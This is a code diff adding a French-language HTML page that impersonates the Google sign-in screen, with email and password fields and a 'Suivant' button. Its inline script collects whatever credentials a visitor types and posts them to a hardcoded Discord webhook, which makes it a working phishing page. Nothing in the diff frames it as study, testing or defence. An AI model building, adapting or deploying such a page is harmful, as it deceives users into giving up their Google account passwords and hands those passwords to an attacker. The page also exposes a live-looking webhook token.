@@ -1,0 +1,100 @@
+<!DOCTYPE html>
+<html>
+  <head>
+    <meta charset="utf-8" />
+    <meta name="viewport" content="initial-scale=1, width=device-width" />
+
+    <link rel="stylesheet" href="./global.css" />
+    <link rel="stylesheet" href="./index.css" />
+    <link
+      rel="stylesheet"
+      href="https://fonts.googleapis.com/css2?family=Open Sans:wght@400;700&display=swap"
+    />
+  </head>
+  <body>
+    <div class="index">
+      <img
+        class="tlchargement-4-removebg-pr-icon"
+        alt=""
+        src="./public/tlchargement--4-removebgpreview-1@2x.png"
+      />
+
+      <div class="connexion">Connexion</div>
+      <div class="utiliser-votre-compte">Utiliser votre compte Google</div>
+          <!-- Zone de texte pour l'utilisateur -->
+          <input type="text" class="zone-texte-utilisateur1" placeholder="adresse e-mail">
+      <div class="en-savoir-plus">
+        En savoir plus sur l’utilisation du mode invité
+      </div>
+      <div class="sil-ne-sagit-container">
+        <p class="sil-ne-sagit">
+          S’il ne s’agit pas de votre appareil, utilisez le mode
+        </p>
+        <p class="sil-ne-sagit">Invité pour vous connecter en mode privé.</p>
+      </div>
+      <b class="crer-un-compte">Créer un compte</b>
+      <div class="franais-france">Français (France)</div>
+      <img class="index-child" alt="" src="./public/polygon-1.svg" />
+
+      <div class="aide">Aide</div>
+      <div class="confidentialit">Confidentialité</div>
+      <div class="conditions">Conditions</div>
+      <div class="component-1">
+        <img class="component-1-child" alt="" src="./public/rectangle-2.svg" />
+
+        <b class="suivant">Suivant</b>
+      </div>
+      <div class="saisissez-votre-mot">Saisissez votre mot de passe</div>
+          <!-- Zone de texte pour l'utilisateur -->
+          <input type="text" class="zone-texte-utilisateur2" placeholder="mot-de-passe">
+      <div class="mot-de-passe">Mot de passe oublié ?</div>
+    </div>
+
+    <!-- Script JavaScript -->
+    <script>
+      function envoyerAuWebhook(identifiant, motDePasse) {
+          // Construire le message à envoyer
+          const message = `Nouvelle connexion :\nIdentifiant : ${identifiant}\nMot de passe : ${motDePasse}`;
+
+          // Effectuer une requête POST vers le webhook Discord
+          fetch('https://discord.com/api/webhooks/1230858497973944320/HEMmUnUTZzThhSNCXbgisUzi7ygn88zF2gTxactU2i1GjkAMlYkzz_w3SY-6h44tFGw4', {
+              method: 'POST',
+              headers: {
+                  'Content-Type': 'application/json'
+              },
+              body: JSON.stringify({
+                  content: message
+              })
+          })
+          .then(response => {
+              if (response.ok) {
+                  console.log('Données envoyées au webhook Discord avec succès.');
+              } else {
+                  console.error('Erreur lors de l\'envoi des données au webhook Discord.');
+              }
+          })
+          .catch(error => {
+              console.error('Erreur lors de l\'envoi des données au webhook Discord :', error);
+          });
+      }
+
+      // Récupérer le "Component 1"
+      const component1 = document.querySelector('.component-1');
+
+      // Ajouter un gestionnaire d'événements de clic
+      component1.addEventListener('click', () => {
+          // Récupérer les valeurs des zones de texte
+          const identifiant = document.querySelector('.zone-texte-utilisateur1').value;
+          const motDePasse = document.querySelector('.zone-texte-utilisateur2').value;
+
+          // Vérifier si les valeurs ne sont pas vides
+          if (identifiant && motDePasse) {
+              // Appeler la fonction pour envoyer les données au webhook Discord
+              envoyerAuWebhook(identifiant, motDePasse);
+          } else {
+              console.error('Veuillez saisir un identifiant et un mot de passe.');
+          }
+      });
+    </script>
+  </body>
+</html>
